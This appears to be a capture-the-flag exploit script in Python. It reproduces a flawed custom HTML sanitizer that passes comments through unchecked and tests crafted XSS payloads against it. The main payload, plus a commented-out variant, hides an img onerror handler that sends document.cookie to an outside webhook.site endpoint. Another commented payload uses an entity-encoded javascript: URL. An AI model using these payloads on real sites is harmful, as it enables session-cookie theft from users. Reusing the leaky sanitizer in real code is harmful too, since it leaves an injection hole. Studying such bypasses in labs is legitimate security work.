x="""
<div a="><!--" ><img src="x" onerror="fetch('https://webhook.site/2d974ddf-9c22-4b64-b0d8-b65637cc9ade?flag='+document.cookie)" /></div> -->
"""


class TrustyParser:
    def __init__(self):
        self.allowed_tags = ['h1', 'h2', 'h3','div', 'p']
        self.result = ""
        self.current_tag = ""

    def parse(self, html):
        i = 0
        while i < len(html):
            char = html[i]

            if char == '<':
                if html[i:i+4] == '<!--':
                    comment_end = html.find('-->', i+4)
                    if comment_end != -1:
                        self.result += html[i:comment_end+3]
                        i = comment_end + 3
                        continue
                    else:
                        break

                tag_end = html.find('>', i+1)
                if tag_end != -1:
                    tag = html[i+1:tag_end]
                    if self.is_allowed_tag(tag):
                        self.result += '<' + tag + '>'
                        if not tag.startswith('/'):
                            self.current_tag = tag.split(' ', 1)[0]
                    i = tag_end + 1
                else:
                    break
            else:
                if self.current_tag:
                    next_tag_start = html.find('<', i)
                    if next_tag_start != -1:
                        self.result += html[i:next_tag_start]
                        i = next_tag_start
                    else:
                        self.result += html[i:]
                        break
                else:
                    i += 1
        return self.result

    def is_allowed_tag(self, tag):
        tag_name = tag.split(' ', 1)[0].rstrip('>')
        return tag_name in self.allowed_tags 



parser=TrustyParser()

# print(parser.parse("""
# <!--
# aa
# -->
# <<<h1><img src="x" onerror="fetch('https://webhook.site/7cdec90d-6553-4521-b1d8-91b5e14aeb3e?flag='+document.cookie)">
# <!--<-->"""))

# print(parser.is_allowed_tag("< >"))

# print(parser.parse(">"))

print('-------------------------------------------')
print(parser.parse(x))



# print(parser.parse("""
#          <!--<!---------->
#                    ><object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
#                    -->

#                    """))